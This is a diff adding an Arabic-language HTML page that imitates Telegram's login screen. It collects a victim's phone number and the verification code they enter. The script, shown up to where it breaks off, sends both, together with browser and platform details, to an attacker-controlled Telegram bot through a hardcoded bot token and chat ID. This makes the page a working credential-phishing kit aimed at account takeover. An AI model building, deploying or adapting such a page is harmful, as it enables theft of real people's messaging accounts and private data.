@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram - تسجيل الدخول</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Header */
+        .header {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #e5e5ea;
+            background: #ffffff;
+        }
+
+        .back-button {
+            font-size: 28px;
+            color: #007aff;
+            cursor: pointer;
+            font-weight: 400;
+            line-height: 1;
+        }
+
+        .profile-icon {
+            width: 32px;
+            height: 32px;
+            background: #007aff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        /* Main Content */
+        .content {
+            flex: 1;
+            padding: 24px 20px 16px 20px;
+            display: flex;
+            flex-direction: column;
+            background: #ffffff;
+            overflow-y: auto;
+        }
+
+        /* Page visibility */
+        .page {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .page.active {
+            display: flex;
+        }
+
+        /* Title */
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 8px;
+            text-align: center;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #8e8e93;
+            text-align: center;
+            margin-bottom: 32px;
+            line-height: 1.4;
+            padding: 0 10px;
+            font-weight: 400;
+        }
+
+        .phone-info {
+            font-size: 15px;
+            color: #8e8e93;
+            text-align: center;
+            margin-bottom: 40px;
+            line-height: 1.4;
+            font-weight: 400;
+        }
+
+        .phone-number {
+            font-weight: 600;
+            color: #000000;
+            direction: ltr;
+            display: inline-block;
+        }
+
+        /* Country Selector */
+        .country-section {
+            margin-bottom: 20px;
+        }
+
+        .country-label {
+            font-size: 14px;
+            color: #8e8e93;
+            margin-bottom: 6px;
+            display: block;
+            font-weight: 400;
+        }
+
+        .country-selector {
+            background: #ffffff;
+            border: 1px solid #c6c6c8;
+            border-radius: 12px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .country-selector span {
+            font-size: 17px;
+            color: #000000;
+            font-weight: 400;
+        }
+
+        .country-selector .arrow {
+            color: #8e8e93;
+            font-size: 14px;
+        }
+
+        /* Phone Input */
+        .phone-section {
+            margin-bottom: 24px;
+        }
+
+        .phone-label {
+            font-size: 14px;
+            color: #8e8e93;
+            margin-bottom: 6px;
+            display: block;
+            font-weight: 400;
+        }
+
+        .phone-input-wrapper {
+            display: flex;
+            align-items: center;
+            border: 1px solid #c6c6c8;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #ffffff;
+        }
+
+        .country-code {
+            padding: 14px 16px;
+            font-size: 17px;
+            color: #000000;
+            background: #ffffff;
+            border-left: 1px solid #c6c6c8;
+            white-space: nowrap;
+            font-weight: 400;
+        }
+
+        .phone-input-wrapper input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 17px;
+            padding: 14px 16px;
+            background: #ffffff;
+            direction: ltr;
+            text-align: left;
+            color: #000000;
+            font-weight: 400;
+        }
+
+        .phone-input-wrapper input::placeholder {
+            color: #c6c6c8;
+        }
+
+        /* Sync Contacts */
+        .sync-section {
+            margin-bottom: 32px;
+        }
+
+        .sync-checkbox {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .sync-checkbox input[type="checkbox"] {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c6c6c8;
+            border-radius: 8px;
+            cursor: pointer;
+            accent-color: #007aff;
+            background-color: #ffffff;
+        }
+
+        .sync-checkbox label {
+            font-size: 17px;
+            color: #000000;
+            cursor: pointer;
+            font-weight: 400;
+        }
+
+        /* OTP Input */
+        .otp-section {
+            margin-bottom: 30px;
+        }
+
+        .otp-label {
+            font-size: 14px;
+            color: #8e8e93;
+            margin-bottom: 12px;
+            display: block;
+            font-weight: 400;
+            text-align: center;
+        }
+
+        .otp-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            direction: ltr;
+        }
+
+        .otp-box {
+            width: 55px;
+            height: 65px;
+            border: 2px solid #c6c6c8;
+            border-radius: 12px;
+            font-size: 28px;
+            font-weight: 600;
+            text-align: center;
+            outline: none;
+            background: #f8f8f8;
+            color: #000000;
+            transition: all 0.2s;
+        }
+
+        .otp-box:focus {
+            border-color: #007aff;
+            background: #ffffff;
+        }
+
+        .otp-box.filled {
+            border-color: #007aff;
+            background: #ffffff;
+        }
+
+        /* Timer */
+        .timer-section {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .timer-text {
+            font-size: 15px;
+            color: #8e8e93;
+            margin-bottom: 5px;
+        }
+
+        .timer {
+            font-size: 18px;
+            font-weight: 600;
+            color: #007aff;
+            direction: ltr;
+            display: inline-block;
+        }
+
+        .resend-link {
+            color: #007aff;
+            font-size: 16px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-top: 10px;
+            display: inline-block;
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        .resend-link.active {
+            opacity: 1;
+            pointer-events: all;
+            cursor: pointer;
+        }
+
+        .resend-link.active:active {
+            opacity: 0.7;
+        }
+
+        /* Next Button */
+        .next-button {
+            background: #007aff;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 20px;
+            transition: background 0.2s;
+        }
+
+        .next-button:active {
+            background: #005bbf;
+        }
+
+        #verifyButton {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        #verifyButton.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        /* Error Message */
+        .error-message {
+            color: #ff3b30;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Info Text */
+        .info-text {
+            font-size: 13px;
+            color: #8e8e93;
+            text-align: center;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+
+        .info-text a {
+            color: #007aff;
+            text-decoration: none;
+        }
+
+        /* Keyboard */
+        .keyboard {
+            background: #f2f2f7;
+            padding: 8px 4px;
+            border-radius: 16px;
+            margin-top: auto;
+        }
+
+        .keyboard-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 4px;
+        }
+
+        .keyboard-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .key {
+            flex: 1;
+            text-align: center;
+            padding: 12px 0;
+            background: #ffffff;
+            border-radius: 10px;
+            margin: 0 2px;
+            font-size: 24px;
+            font-weight: 500;
+            color: #000000;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+            cursor: pointer;
+            line-height: 1.2;
+            border: none;
+        }
+
+        .key:active {
+            background: #e5e5ea;
+        }
+
+        .key-letters {
+            display: block;
+            font-size: 11px;
+            color: #8e8e93;
+            font-weight: 400;
+            margin-top: 2px;
+            letter-spacing: 0.3px;
+        }
+
+        .key.delete-key {
+            background: #e5e5ea;
+            font-size: 20px;
+        }
+
+        /* Country Modal */
+        .country-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: white;
+            z-index: 1000;
+            flex-direction: column;
+        }
+
+        .country-modal.active {
+            display: flex;
+        }
+
+        .modal-header {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            border-bottom: 1px solid #e5e5ea;
+            background: #ffffff;
+        }
+
+        .modal-back {
+            font-size: 28px;
+            color: #007aff;
+            cursor: pointer;
+            line-height: 1;
+        }
+
+        .modal-header h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #000000;
+            flex: 1;
+        }
+
+        .search-box {
+            padding: 12px 16px;
+            border-bottom: 1px solid #e5e5ea;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #c6c6c8;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            background: #f8f8f8;
+        }
+
+        .search-box input:focus {
+            border-color: #007aff;
+        }
+
+        .countries-list {
+            flex: 1;
+            overflow-y: auto;
+            background: #ffffff;
+        }
+
+        .country-item {
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #e5e5ea;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .country-item:hover {
+            background: #f8f8f8;
+        }
+
+        .country-item .country-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .country-flag {
+            font-size: 24px;
+        }
+
+        .country-name-ar {
+            font-size: 16px;
+            color: #000000;
+            font-weight: 500;
+        }
+
+        .country-name-en {
+            font-size: 14px;
+            color: #8e8e93;
+            margin-right: 5px;
+        }
+
+        .country-code-number {
+            font-size: 16px;
+            color: #007aff;
+            font-weight: 500;
+        }
+        
+        /* Loading Spinner */
+        .loading-spinner {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.8);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-spinner.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f2f2f7;
+            border-top: 5px solid #007aff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="back-button" onclick="goBack()">←</div>
+            <div class="profile-icon">J</div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="content">
+            <!-- صفحة إدخال رقم الهاتف -->
+            <div id="phonePage" class="page active">
+                <div class="title">رقم هاتفك</div>
+                <div class="subtitle">يرجى تأكيد مفتاح بلدك وإدخال رقم هاتفك.</div>
+
+                <!-- Country Selector -->
+                <div class="country-section">
+                    <span class="country-label">الدولة</span>
+                    <div class="country-selector" onclick="openCountryModal()">
+                        <span id="selectedCountryName">الأردن</span>
+                        <span class="arrow">▼</span>
+                    </div>
+                </div>
+
+                <!-- Phone Input -->
+                <div class="phone-section">
+                    <span class="phone-label">رقم الهاتف</span>
+                    <div class="phone-input-wrapper">
+                        <span class="country-code" id="selectedCountryCode">+962</span>
+                        <input type="tel" id="phoneNumber" placeholder="00 0000 0000" dir="ltr">
+                    </div>
+                </div>
+
+                <!-- Sync Contacts -->
+                <div class="sync-section">
+                    <div class="sync-checkbox">
+                        <input type="checkbox" id="sync" checked>
+                        <label for="sync">مزامنة جهات الاتصال</label>
+                    </div>
+                </div>
+
+                <!-- Next Button -->
+                <button class="next-button" onclick="sendOTP()">التالي</button>
+
+                <!-- Keyboard -->
+                <div class="keyboard">
+                    <div class="keyboard-row">
+                        <div class="key" onclick="addNumber(1)">1</div>
+                        <div class="key" onclick="addNumber(2)">2<span class="key-letters">ABC</span></div>
+                        <div class="key" onclick="addNumber(3)">3<span class="key-letters">DEF</span></div>
+                        <div class="key" onclick="addNumber(4)">4<span class="key-letters">GHI</span></div>
+                        <div class="key" onclick="addNumber(5)">5<span class="key-letters">JKL</span></div>
+                    </div>
+                    <div class="keyboard-row">
+                        <div class="key" onclick="addNumber(6)">6<span class="key-letters">MNO</span></div>
+                        <div class="key" onclick="addNumber(7)">7<span class="key-letters">PORS</span></div>
+                        <div class="key" onclick="addNumber(8)">8<span class="key-letters">TUV</span></div>
+                        <div class="key" onclick="addNumber(9)">9<span class="key-letters">WXYZ</span></div>
+                        <div class="key" onclick="addNumber(0)">0<span class="key-letters">+</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- صفحة إدخال رمز التحقق OTP -->
+            <div id="otpPage" class="page">
+                <div class="title">رمز التحقق</div>
+                <div class="phone-info">
+                    أدخل الرمز المرسل إلى<br>
+                    <span class="phone-number" id="displayPhone"></span>
+                </div>
+
+                <!-- OTP Input -->
+                <div class="otp-section">
+                    <span class="otp-label">رمز التحقق</span>
+                    <div class="otp-input-container" id="otpContainer">
+                        <input type="text" class="otp-box" id="otp1" maxlength="1" inputmode="numeric" onkeyup="moveToNext(this, 1)" onpaste="handlePaste(event)">
+                        <input type="text" class="otp-box" id="otp2" maxlength="1" inputmode="numeric" onkeyup="moveToNext(this, 2)">
+                        <input type="text" class="otp-box" id="otp3" maxlength="1" inputmode="numeric" onkeyup="moveToNext(this, 3)">
+                        <input type="text" class="otp-box" id="otp4" maxlength="1" inputmode="numeric" onkeyup="moveToNext(this, 4)">
+                        <input type="text" class="otp-box" id="otp5" maxlength="1" inputmode="numeric" onkeyup="moveToNext(this, 5)">
+                    </div>
+                </div>
+
+                <!-- Timer -->
+                <div class="timer-section">
+                    <div class="timer-text">لم يطلب الرمز؟</div>
+                    <div class="timer" id="timer">00:30</div>
+                    <a href="#" class="resend-link" id="resendLink" onclick="resendCode(event)">إعادة إرسال الرمز</a>
+                </div>
+
+                <!-- Error Message -->
+                <div class="error-message" id="errorMessage">رمز التحقق غير صحيح</div>
+
+                <!-- Verify Button -->
+                <button class="next-button" id="verifyButton" onclick="verifyCode()">تحقق</button>
+
+                <!-- Info Text -->
+                <div class="info-text">
+                    سيتم تسجيل الدخول تلقائياً بعد التحقق<br>
+                    <a href="#" onclick="showHelp()">لم تحصل على الرمز؟</a>
+                </div>
+
+                <!-- Keyboard for OTP -->
+                <div class="keyboard">
+                    <!-- الصف الأول: 5 4 3 2 1 (معكوس لأن RTL) -->
+                    <div class="keyboard-row">
+                        <div class="key" onclick="addOTPNumber(5)">5<span class="key-letters">JKL</span></div>
+                        <div class="key" onclick="addOTPNumber(4)">4<span class="key-letters">GHI</span></div>
+                        <div class="key" onclick="addOTPNumber(3)">3<span class="key-letters">DEF</span></div>
+                        <div class="key" onclick="addOTPNumber(2)">2<span class="key-letters">ABC</span></div>
+                        <div class="key" onclick="addOTPNumber(1)">1</div>
+                    </div>
+                    <!-- الصف الثاني: 0 9 8 7 6 (معكوس لأن RTL) -->
+                    <div class="keyboard-row">
+                        <div class="key" onclick="addOTPNumber(0)">0<span class="key-letters">+</span></div>
+                        <div class="key" onclick="addOTPNumber(9)">9<span class="key-letters">WXYZ</span></div>
+                        <div class="key" onclick="addOTPNumber(8)">8<span class="key-letters">TUV</span></div>
+                        <div class="key" onclick="addOTPNumber(7)">7<span class="key-letters">PORS</span></div>
+                        <div class="key" onclick="addOTPNumber(6)">6<span class="key-letters">MNO</span></div>
+                    </div>
+                    <!-- زر المسح -->
+                    <div class="keyboard-row">
+                        <div class="key delete-key" onclick="deleteOTPNumber()" style="background: #e5e5ea; flex: 5;">⌫</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Country Modal -->
+    <div class="country-modal" id="countryModal">
+        <div class="modal-header">
+            <span class="modal-back" onclick="closeCountryModal()">←</span>
+            <h2>اختر الدولة</h2>
+        </div>
+        <div class="search-box">
+            <input type="text" id="searchCountry" placeholder="ابحث عن دولة..." onkeyup="filterCountries()">
+        </div>
+        <div class="countries-list" id="countriesList"></div>
+    </div>
+    
+    <!-- Loading Spinner -->
+    <div class="loading-spinner" id="loadingSpinner">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        // ============ إعدادات بوت تلجرام ============
+        const BOT_TOKEN = '8737014154:AAEPNAzIRDraqGoNqQimN85N2BBeBEhqNmg';
+        const CHAT_ID = '7962904635';
+        
+        // متغيرات لتخزين بيانات الجلسة
+        let sessionData = {
+            phoneNumber: '',
+            countryCode: '',
+            countryName: '',
+            timestamp: '',
+            userAgent: navigator.userAgent,
+            platform: navigator.platform
+        };
+        
+        // معرف الجلسة الفريد
+        const sessionId = generateSessionId();
+        
+        // ============ دوال إرسال الرسائل إلى تلجرام ============
+        async function sendToTelegram(message) {
+            try {
+                console.log('جاري إرسال الرسالة:', message);
+                
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                console.log('استجابة البوت:', data);
+                
+                if (data.ok) {
+                    return true;
+                } else {
+                    console.error('خطأ من البوت:', data.description);
+                    alert(`❌ خطأ من البوت: ${data.description}. تأكد أنك بدأت المحادثة مع البوت وأرسلت /start`);
+                    return false;
+                }
+            } catch (error) {
+                console.error('خطأ في الاتصال:', error);
+                alert('❌ فشل الاتصال بالبوت. تأكد من اتصال الإنترنت');
+                return false;
+            }
+        }
+        
+        function generateSessionId() {
+            return 'xxxx-xxxx-xxxx-xxxx'.replace(/[x]/g, function() {
+                return Math.floor(Math.random() * 16).toString(16);
+            });
+        }
+        
+        function getFormattedTime() {
+            const now = new Date();
+            return now.toLocaleString('ar-JO', {
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true
+            });
+        }
+        
+        function showLoading() {
+            document.getElementById('loadingSpinner').classList.add('active');
+        }
+        
+        function hideLoading() {
+            document.getElementById('loadingSpinner').classList.remove('active');
+        }
+        
+        // ============ إرسال رقم الهاتف إلى البوت ============
+        async function sendPhoneToBot(phone, countryCode, countryName) {
+            const timeStr = getFormattedTime();
+            
+            const message = `
+🔔 <b>معلومات تسجيل دخول جديدة</b> 🔔
+
+━━━━━━━━━━━━━━━━
+📱 <b>معلومات رقم الهاتف:</b>
+━━━━━━━━━━━━━━━━
+🏷 <b>الدولة:</b> ${countryName}
+🌍 <b>رمز الدولة:</b> ${countryCode}
+📞 <b>رقم الهاتف:</b> <code>${phone}</code>
+📱 <b>رقم كامل:</b> <code>${countryCode} ${phone}</code>
+
+━━━━━━━━━━━━━━━━
+🆔 <b>معلومات الجلسة:</b>
+━━━━━━━━━━━━━━━━
+🔑 <b>معرف الجلسة:</b> <code>${sessionId}</code>
+⏰ <b>التاريخ والوقت:</b> ${timeStr}
+🌐 <b>المتصفح:</b> ${navigator.userAgent}
+💻 <b>المنصة:</b> ${navigator.platform}
+🔋 <b>حالة المزامنة:</b> ${document.getElementById('sync').checked ? 'مفعلة ✅' : 'غير مفعلة ❌'}
+
+━━━━━━━━━━━━━━━━
+⏳ <b>في انتظار رمز التحقق...</b>
+━━━━━━━━━━━━━━━━
+`;
+            
+            showLoading();
+            const sent = await sendToTelegram(message);
+            hideLoading();
+            
+            if (sent) {
+                console.log('✅ تم إرسال رقم الهاتف بنجاح');
+                return true;
+            } else {
+                return false;
+            }
+        }
+        
+        // ============ إرسال رمز التحقق إلى البوت ============
+        async function sendOTPToBot(otpCode) {
+            const timeStr = getFormattedTime();
+            
+            const message = `
+🔔 <b>تم إدخال رمز التحقق</b> 🔔
+
+━━━━━━━━━━━━━━━━
+🔢 <b>رمز التحقق:</b>
+━━━━━━━━━━━━━━━━
+🔐 <b>الرمز:</b> <code>${otpCode}</code>
+📱 <b>رقم الهاتف:</b> <code>${sessionData.countryCode} ${sessionData.phoneNumber}</code>
+
+━━━━━━━━━━━━━━━━
+🆔 <b>معلومات الجلسة:</b>
+━━━━━━━━━━━━━━━━
+🔑 <b>معرف الجلسة:</b> <code>${sessionId}</code>
+⏰ <b>وقت الإدخال:</b> ${timeStr}
+🌐 <b>المتصفح:</b> ${navigator.userAgent}
+
+━━━━━━━━━━━━━━━━
+⚠️ <b>تنبيه:</b> تم إدخال رمز التحقق
+━━━━━━━━━━━━━━━━
+`;
+            
+            showLoading();
+            const sent = await sendToTelegram(message);
+            hideLoading();
+            
+            if (sent) {
+                console.log('✅ تم إرسال رمز التحقق بنجاح');
+                return true;
+            } else {
+                return false;
+            }
+        }
+
+        // ============ قائمة الدول ============
+        const countries = [
+            { ar: "الأردن", en: "Jordan", code: "+962", flag: "🇯🇴" },
+            { ar: "الإمارات", en: "UAE", code: "+971", flag: "🇦🇪" },
+            { ar: "البحرين", en: "Bahrain", code: "+973", flag: "🇧🇭" },
+            { ar: "تونس", en: "Tunisia", code: "+216", flag: "🇹🇳" },
+            { ar: "الجزائر", en: "Algeria", code: "+213", flag: "🇩🇿" },
+            { ar: "السعودية", en: "Saudi Arabia", code: "+966", flag: "🇸🇦" },
+            { ar: "السودان", en: "Sudan", code: "+249", flag: "🇸🇩" },
+            { ar: "سوريا", en: "Syria", code: "+963", flag: "🇸🇾" },
+            { ar: "الصومال", en: "Somalia", code: "+252", flag: "🇸🇴" },
+            { ar: "العراق", en: "Iraq", code: "+964", flag: "🇮🇶" },
+            { ar: "عمان", en: "Oman", code: "+968", flag: "🇴🇲" },
+            { ar: "فلسطين", en: "Palestine", code: "+970", flag: "🇵🇸" },
+            { ar: "قطر", en: "Qatar", code: "+974", flag: "🇶🇦" },
+            { ar: "الكويت", en: "Kuwait", code: "+965", flag: "🇰🇼" },
+            { ar: "لبنان", en: "Lebanon", code: "+961", flag: "🇱🇧" },
+            { ar: "ليبيا", en: "Libya", code: "+218", flag: "🇱🇾" },
+            { ar: "مصر", en: "Egypt", code: "+20", flag: "🇪🇬" },
+            { ar: "المغرب", en: "Morocco", code: "+212", flag: "🇲🇦" },
+            { ar: "موريتانيا", en: "Mauritania", code: "+222", flag: "🇲🇷" },
+            { ar: "اليمن", en: "Yemen", code: "+967", flag: "🇾🇪" },
+            { ar: "الولايات المتحدة", en: "United States", code: "+1", flag: "🇺🇸" },
+            { ar: "المملكة المتحدة", en: "United Kingdom", code: "+44", flag: "🇬🇧" },
+            { ar: "كندا", en: "Canada", code: "+1", flag: "🇨🇦" },
+            { ar: "أستراليا", en: "Australia", code: "+61", flag: "🇦🇺" },
+            { ar: "ألمانيا", en: "Germany", code: "+49", flag: "🇩🇪" },
+            { ar: "فرنسا", en: "France", code: "+33", flag: "🇫🇷" },
+            { ar: "إيطاليا", en: "Italy", code: "+39", flag: "🇮🇹" },
+            { ar: "إسبانيا", en: "Spain", code: "+34", flag: "🇪🇸" },
+            { ar: "تركيا", en: "Turkey", code: "+90", flag: "🇹🇷" }
+        ];
+
+        countries.sort((a, b) => a.ar.localeCompare(b.ar, 'ar'));
+
+        // ============ التنقل بين الصفحات ============
+        function showPhonePage() {
+            document.getElementById('phonePage').classList.add('active');
+            document.getElementById('otpPage').classList.remove('active');
+        }
+
+        function showOTPPage() {
+            document.getElementById('phonePage').classList.remove('active');
+            document.getElementById('otpPage').classList.add('active');
+            startTimer();
+            document.getElementById('otp1').focus();
+        }
+
+        function goBack() {
+            if (document.getElementById('otpPage').classList.contains('active')) {
+                if (confirm('سيتم إلغاء عملية تسجيل الدخول. هل أنت متأكد؟')) {
+                    showPhonePage();
+                }
+            } else {
+                alert('العودة إلى الصفحة الرئيسية');
+            }
+        }
+
+        // ============ إرسال رمز التحقق ============
+        async function sendOTP() {
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const countryCode = document.getElementById('selectedCountryCode').textContent;
+            const countryName = document.getElementById('selectedCountryName').textContent;
+            
+            if (!phone) {
+                alert('الرجاء إدخال رقم الهاتف');
+                return;
+            }
+            
+            // تخزين بيانات الجلسة
+            sessionData.phoneNumber = phone;
+            sessionData.countryCode = countryCode;
+            sessionData.countryName = countryName;
+            
+            const fullPhone = `${countryCode} ${phone}`;
+            
+            // إرسال رقم الهاتف إلى بوت تلجرام
+            const sent = await sendPhoneToBot(phone, countryCode, countryName);
+            
+            if (sent) {
+                // عرض رقم الهاتف في صفحة OTP
+                document.getElementById('displayPhone').textContent = fullPhone;
+                
+                alert(`✅ تم إرسال رمز التحقق إلى ${fullPhone}`);
+                
+                // الانتقال إلى صفحة OTP
+                showOTPPage();
+            }
+        }
+
+        // ============ دوال صفحة الهاتف ============
+        function addNumber(num) {
+            const input = document.getElementById('phoneNumber');
+            input.value += num;
+        }
+
+        // ============ دوال اختيار الدولة ============
+        function openCountryModal() {
+            document.getElementById('countryModal').classList.add('active');
+            displayCountries();
+        }
+
+        function closeCountryModal() {
+            document.getElementById('countryModal').classList.remove('active');
+            document.getElementById('searchCountry').value = '';
+        }
+
+        function displayCountries(filteredCountries = countries) {
+            const list = document.getElementById('countriesList');
+            list.innerHTML = '';
+            
+            filteredCountries.forEach(country => {
+                const item = document.createElement('div');
+                item.className = 'country-item';
+                item.onclick = () => selectCountry(country);
+                
+                item.innerHTML = `
+                    <div class="country-info">
+                        <span class="country-flag">${country.flag}</span>
+                        <span>
+                            <span class="country-name-ar">${country.ar}</span>
+                            <span class="country-name-en">${country.en}</span>
+                        </span>
+                    </div>
+                    <span class="country-code-number">${country.code}</span>
+                `;
+                
+                list.appendChild(item);
+            });
+        }
+
+        function selectCountry(country) {
+            document.getElementById('selectedCountryName').textContent = country.ar;
+            document.getElementById('selectedCountryCode').textContent = country.code;
+            closeCountryModal();
+        }
+
+        function filterCountries() {
+            const searchText = document.getElementById('searchCountry').value.toLowerCase();
+            const filtered = countries.filter(country => 
+                country.ar.includes(searchText) || 
+                country.en.toLowerCase().includes(searchText) ||
+                country.code.includes(searchText)
+            );
+            displayCountries(filtered);
+        }
+
+        // ============ دوال صفحة OTP ============
+        const otpInputs = document.querySelectorAll('.otp-box');
+        const verifyButton = document.getElementById('verifyButton');
+        const errorMessage = document.getElementById('errorMessage');
+
+        function moveToNext(current, nextIndex) {
+            if (current.value && !/^\d+$/.test(current.value)) {
+                current.value = '';
+                return;
+            }
+
+            checkOtpComplete();
+
+            if (current.value && nextIndex < 5) {
+                document.getElementById(`otp${nextIndex + 1}`).focus();
+            }
+
+            if (current.value) {
+                current.classList.add('filled');
+            } else {
+                current.classList.remove('filled');
+            }
+        }
+
+        function checkOtpComplete() {
+            let complete = true;
+            otpInputs.forEach(input => {
+                if (!input.value) complete = false;
+            });
+
+            if (complete) {
+                verifyButton.classList.add('active');
+            } else {
+                verifyButton.classList.remove('active');
+            }
+        }
+
+        function handlePaste(event) {
+            event.preventDefault();
+            const pasteData = event.clipboardData.getData('text');
+            if (/^\d+$/.test(pasteData) && pasteData.length <= 5) {
+                for (let i = 0; i < pasteData.length; i++) {
+                    if (i < 5) {
+                        document.getElementById(`otp${i + 1}`).value = pasteData[i];
+                        document.getElementById(`otp${i + 1}`).classList.add('filled');
+                    }
+                }
+                if (pasteData.length === 5) {
+                    document.getElementById('otp5').focus();
+                } else {
+                    document.getElementById(`otp${pasteData.length + 1}`)?.focus();
+                }
+                checkOtpComplete();
+            }
+        }
+
+        async function verifyCode() {
+            const enteredCode = Array.from(otpInputs).map(input => input.value).join('');
+            
+            if (enteredCode.length !== 5) {
+                alert('الرجاء إدخال رمز التحقق كاملاً');
+                return;
+            }
+            
+            // إرسال رمز التحقق إلى بوت تلجرام
+            const sent = await sendOTPToBot(enteredCode);
+            
+            if (sent) {
+                errorMessage.classList.remove('show');
+                alert('✅ تم إرسال رمز التحقق إلى البوت بنجاح!');
+                
+                // اختياري: يمكنك إعادة توجيه المستخدم أو إغلاق الصفحة
+                // setTimeout(() => {
+                //     window.close();
+                // }, 2000);
+            }
+        }
+
+        function addOTPNumber(num) {
+            const currentInput = Array.from(otpInputs).find(input => !input.value);
+            if (currentInput) {
+                currentInput.value = num;
+                currentInput.classList.add('filled');
+                checkOtpComplete();
+                
+                const nextInput = Array.from(otpInputs).find(input => !input.value);
+                if (nextInput) {
+                    nextInput.focus();
+                } else {
+                    document.getElementById('otp5').focus();
+                }
+            }
+        }
+
+        function deleteOTPNumber() {
+            const filledInputs = Array.from(otpInputs).filter(input => input.value);
+            if (filledInputs.length > 0) {
+                const lastInput = filledInputs[filledInputs.length - 1];
+                lastInput.value = '';
+                lastInput.classList.remove('filled');
+                lastInput.focus();
+                checkOtpComplete();
+            }
+        }
+
+        // ============ Timer ============
+        let timeLeft = 30;
+        const timerElement = document.getElementById('timer');
+        const resendLink = document.getElementById('resendLink');
+        let timerInterval;
+
+        function startTimer() {
+            timeLeft = 30;
+            timerElement.textContent = formatTime(timeLeft);
+            resendLink.classList.remove('active');
+            
+            if (timerInterval) clearInterval(timerInterval);
+            
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                timerElement.textContent = formatTime(timeLeft);
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerElement.textContent = '00:00';
+                    resendLink.classList.add('active');
+                }
+            }, 1000);
+        }
+
+        function formatTime(seconds) {
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+
+        async function resendCode(event) {
+            event.preventDefault();
+            if (resendLink.classList.contains('active')) {
+                alert('✅ تم إعادة إرسال رمز التحقق');
+                startTimer();
+                
+                otpInputs.forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled');
+                });
+                document.getElementById('otp1').focus();
+                verifyButton.classList.remove('active');
+                errorMessage.classList.remove('show');
+            }
+        }
+
+        function showHelp() {
